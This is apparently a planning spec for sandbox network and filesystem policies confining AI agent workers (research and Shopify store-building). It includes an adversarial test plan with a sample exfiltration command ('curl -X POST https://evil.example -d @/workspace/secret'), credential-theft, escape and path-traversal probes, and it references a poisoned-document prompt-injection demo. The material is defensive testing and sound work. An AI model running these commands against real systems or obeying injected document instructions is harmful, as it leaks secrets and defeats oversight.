# Spec — OpenShell Worker Policies (`policies/*.yaml`)

Status: **spec only, planning mode — no code/YAML files touched until flag lifted.**
Owner: Sky. Files to correct/create: `policies/worker-research.yaml` (fix to real schema), `policies/worker-storebuilder.yaml` (new).
Schema source: `docs.nvidia.com/openshell/reference/policy-schema` + `examples/sandbox-policy-quickstart/policy.yaml`. Judged **adversarially** (NemoClaw/OpenShell bounty) — test by trying to break it.

---

## 1. Two corrections to our assumptions

1. **There is NO `inference` / `inference_policy` section in the policy YAML.** The plan's "policy C = inference" and the per-worker "inference" box in the arch diagram are wrong. Inference routing is configured out-of-band via `openshell inference set --provider nvidia-nim --model ...` (see `nemoclaw-spawn.spec.md` §5.3), NOT in the policy file.
2. **Credential handling is per-endpoint, not a global secrets block.** OpenShell strips/rewrites credentials at the network egress boundary (`credential_signing`, `request_body_credential_rewrite`, `websocket_credential_rewrite` with `openshell:resolve:env:KEY` placeholders). This is the mechanism that lets a worker call Shopify/Apify **without ever holding the raw token** — the sandbox sends a placeholder, the gateway swaps in the real secret. Central to the vault boundary AND the poisoned-doc demo (can't exfil a secret you never had).

---

## 2. Real schema (top-level)

`version: 1` (required, integer, must be 1) plus:

| Key | Type | Static/Dynamic | Purpose |
|---|---|---|---|
| `filesystem_policy` | object | **Static** (locked at creation) | read_only / read_write path allowlists |
| `landlock` | object | **Static** | `compatibility: best_effort` (default) or `hard_requirement` |
| `process` | object | **Static** | `run_as_user` / `run_as_group` (default `sandbox`; root forbidden) |
| `network_policies` | map | **Dynamic** (hot-reload) | named egress allowlists — the exfil defense |
| `network_middlewares` | map | **Dynamic** (max 10) | ordered request middlewares, `fail_closed` default |

**Ordering consequence (critical):** static sections (`filesystem_policy`, `process`, `landlock`) lock at `nemoclaw onboard` time — must be correct BEFORE Phase A. `network_policies` can be `openshell policy set` hot-reloaded in Phase B. So: bake fs/process into the onboard policy; iterate network live.

### filesystem_policy
- `include_workdir` (bool) — adds workdir to read_write
- `read_only` (list, absolute paths, no `..`, ≤4096 chars each, ≤256 combined)
- `read_write` (list, same constraints)

### network_policies (map of named entries) — the core of the bounty
Each entry: `endpoints` (list, **required**) + `binaries` (list, **required**).

**Endpoint** key fields: `host` (req; `*` wildcard only in first DNS label), `port` (req), `path`, `protocol` (`rest`/`websocket`/`graphql`/`mcp`/`json-rpc`/omit=TCP), `tls` (`skip`), `enforcement` (`enforce`/`audit`), `access` (`read-only`/`read-write`/`full` — mutually exclusive with `rules`), `rules`, `deny_rules` (take precedence), `allowed_ips`, `credential_signing` (`sigv4`/`sigv4:body`/`sigv4:no_body`), `request_body_credential_rewrite`, `websocket_credential_rewrite`.

**Access presets:** `full` = all; `read-only` = GET/HEAD/OPTIONS; `read-write` = GET/HEAD/OPTIONS/POST/PUT/PATCH.

**Binary:** `path` (req; `*`/`**` globs).

**Default is deny.** Anything not in an allowlisted endpoint is blocked → this is exactly what stops `evil.example` in the poisoned-doc demo, independent of HiddenLayer.

---

## 3. Draft — `worker-research.yaml` (corrected to real schema)

Research worker: Nemotron inference + **harness-brokered** document ingest. Read-mostly. No Shopify.

> **Ingest is harness-brokered, not a sandbox egress (design decision).** Earlier
> drafts allowlisted `api.apify.com` directly from the research sandbox. That breaks
> the poisoned-doc demo's Layer 1: a document the worker fetches *from inside* the
> sandbox never passes through the harness `scan("ingested_document")`, so HiddenLayer
> never sees it. Instead the worker calls a harness-side ingest tool → the Factory/
> dispatcher performs the Apify fetch, runs `scan()`, and returns the (clean-or-flagged)
> text into the sandbox. Same broker pattern as CEO spawn (`ceo-sandbox.spec.md` §2a):
> the dangerous egress lives on a narrow, gate-instrumented host choke point, not in
> the most-targeted sandbox. Net effect: the research sandbox's own egress allowlist
> is **inference-only**, and default-deny still independently blocks the `evil.example`
> exfil (Layer 2). Capability is unchanged — the worker still drives research; it just
> can't fetch un-scanned bytes. Cross-ref `nemoclaw-spawn.spec.md` §6.1,
> `poisoned-doc-demo.spec.md` §2.

```yaml
version: 1

filesystem_policy:
  include_workdir: true
  read_only:
    - /usr/lib/**
    - /usr/local/lib/**
  read_write:
    - /workspace/**
    - /tmp

process:
  run_as_user: sandbox
  run_as_group: sandbox

landlock:
  compatibility: best_effort

network_policies:
  # NO apify endpoint here — Apify ingest is harness-brokered (see note above), so
  # the research sandbox never fetches external documents itself. This is the point:
  # every ingested doc is forced through the harness gate, and the sandbox's only
  # egress is inference.
  nvidia_inference:
    name: nvidia-inference
    endpoints:
      # ONLY needed if routed inference does NOT exit via the localhost gateway.
      # Confirm at onboarding (open item §6). If it exits via gateway, delete this
      # whole entry and the sandbox has zero direct egress (strongest default-deny).
      - host: integrate.api.nvidia.com
        port: 443
        protocol: rest
        enforcement: enforce
        access: read-write
        request_body_credential_rewrite: true   # nvapi key as openshell:resolve:env:NVIDIA_API_KEY
    binaries:
      - path: /usr/local/bin/openclaw
      - path: /usr/bin/node
```

Everything else (incl. `api.apify.com` from inside the sandbox, and `evil.example`) → default-deny.

---

## 4. Draft — `worker-storebuilder.yaml` (new)

StoreBuilder: Shopify Admin API only. Write access. Token never held by agent.

```yaml
version: 1

filesystem_policy:
  include_workdir: true
  read_only:
    - /usr/lib/**
    - /usr/local/lib/**
  read_write:
    - /workspace/**
    - /tmp

process:
  run_as_user: sandbox
  run_as_group: sandbox

landlock:
  compatibility: best_effort

network_policies:
  shopify_admin:
    name: shopify-admin
    endpoints:
      - host: "*.myshopify.com"      # wildcard allowed in first DNS label only
        port: 443
        protocol: rest
        enforcement: enforce
        # Path-level rules instead of a blunt `access: read-write` — this is the
        # "non-trivial policy" the bounty rewards (allow-with-boundary, not a global
        # allow). `access` is mutually exclusive with `rules`, so it is omitted.
        # deny_rules take precedence over rules (schema §2).
        rules:
          # StoreBuilder's job: create/update catalog. Nothing else.
          - methods: [GET, POST, PUT]
            path: /admin/api/*/products*
          - methods: [GET, POST, PUT]
            path: /admin/api/*/collections*
          - methods: [GET, POST]
            path: /admin/api/*/inventory_levels*
        deny_rules:
          # PII / financial boundary INSIDE an allowed host — the agent has a live
          # write token and still cannot touch customers or orders. This is the line
          # judges can test under pressure: it holds even if the agent is compromised.
          - path: /admin/api/*/customers*
          - path: /admin/api/*/orders*
          - path: /admin/api/*/price_rules*
          - path: /admin/api/*/gift_cards*
        request_body_credential_rewrite: true   # X-Shopify-Access-Token via openshell:resolve:env:SHOPIFY_TOKEN
      # Graduated enforcement: fulfillment is read-only AND audit-mode (log, don't
      # block) — shows the policy makes judgments, not one global switch.
      - host: "*.myshopify.com"
        port: 443
        protocol: rest
        enforcement: audit
        rules:
          - methods: [GET]
            path: /admin/api/*/fulfillment_orders*
        request_body_credential_rewrite: true
    binaries:
      - path: /usr/local/bin/openclaw
      - path: /usr/bin/node
```

No Apify endpoint → StoreBuilder cannot reach Apify (least privilege per role).

> **Open item (schema-confirm):** the exact `rules` / `deny_rules` sub-shape
> (`methods` + `path`? `path` glob syntax?) is not spelled out in the schema table §2 —
> confirm field names against `openshell policy validate` at onboarding. The *design*
> (allow products/collections, deny customers/orders/price at path granularity, one
> audit endpoint) is the point; the exact keys may need a tweak.

---

## 5. Adversarial test plan (bounty is judged this way — break your own policy)

From inside each sandbox (`nemoclaw <role> connect`), attempt and confirm each is BLOCKED:

1. **Exfil to arbitrary host:** `curl -X POST https://evil.example -d @/workspace/secret` → blocked (default-deny egress). This is the poisoned-doc demo's independent block.
2. **Wrong-API access:** from StoreBuilder, hit `api.apify.com` → blocked (not in its allowlist).
3. **Method escalation:** on a `read-only` endpoint, attempt `POST`/`DELETE` → blocked.
3b. **PII boundary inside an allowed host (the non-trivial-policy proof):** from StoreBuilder, with a valid write token, `GET/POST *.myshopify.com/admin/api/2024-01/customers.json` and `.../orders.json` → blocked by `deny_rules` even though the host and token are allowed. Then `POST .../products.json` → allowed. This is the demo-able "it knows how, it has the token, it still can't" line.
4. **Credential theft:** print env / read files looking for the raw `SHOPIFY_TOKEN`/`APIFY_TOKEN` → agent only ever sees the `openshell:resolve:env:*` placeholder, real token injected at gateway. Confirm raw token absent in sandbox.
5. **Filesystem escape:** write to `/usr/lib`, `/etc`, or `..` outside workspace → blocked (static fs policy + landlock).
6. **Privilege escalation:** attempt `run_as root` / sudo → blocked (`process.run_as_user: sandbox`, root forbidden).
7. **Path traversal / encoded slash:** `%2F..%2F` tricks → blocked (`allow_encoded_slash` defaults false).

Log each attempt+result → feeds the "defense in depth, on screen" demo narrative.

---

## 6. Open items to confirm during Friday-night onboarding

- [ ] Routed NVIDIA inference egress path: gateway-local (no policy entry) vs sandbox must allowlist `integrate.api.nvidia.com:443`. Determines whether an inference endpoint block is needed in each policy.
- [ ] Exact placeholder resolution syntax for header creds (`request_body_credential_rewrite` vs a header-specific rewrite) for Shopify's `X-Shopify-Access-Token` and Apify's bearer.
- [ ] Whether `nemoclaw onboard` takes a `--policy <file>` for the static sections, or static policy is authored separately then sandbox created against it. Affects Phase A wiring (cross-ref `nemoclaw-spawn.spec.md` §8).
- [ ] Confirm `*.myshopify.com` wildcard resolves to the specific dev store, or pin the exact store host.
- [ ] Validate each YAML with any `openshell policy validate` / lint before demo.
- [ ] Exact `rules` / `deny_rules` sub-shape (`methods` + `path`? glob syntax?) — see §4 note. Needed for the Shopify PII-boundary policy.
- [ ] **HiddenLayer-in-egress stretch:** does `network_middlewares` (dynamic, `fail_closed`, max 10) let an egress hook call the HiddenLayer Runtime API inline? If yes, in-sandbox tool_call / tool_result get scanned without a harness round-trip — closes the last instrumentation gap (`nemoclaw-spawn.spec.md` §6.1). Confirm feasibility; do NOT put it on the demo critical path.
- [ ] **Inference credential must be a placeholder in-sandbox.** `nemoclaw-spawn.spec.md` §2 puts `NVIDIA_API_KEY` in the host `.env`. Confirm the routed-inference key reaches the sandbox as `openshell:resolve:env:NVIDIA_API_KEY` (rewrite), NOT as a raw `nvapi-...` in sandbox env — otherwise the poisoned-doc credential-hygiene test (`poisoned-doc-demo.spec.md` §5.5) fails and there IS a real secret to exfil.
